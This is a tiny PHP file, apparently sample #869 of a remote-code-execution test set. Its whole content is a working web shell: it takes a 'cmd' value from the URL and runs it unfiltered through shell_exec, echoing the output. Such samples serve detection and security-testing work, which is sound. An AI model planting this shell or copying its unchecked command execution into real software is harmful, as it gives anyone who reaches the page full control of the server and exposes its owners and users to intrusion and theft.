<?php
// RCE test variation #869
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>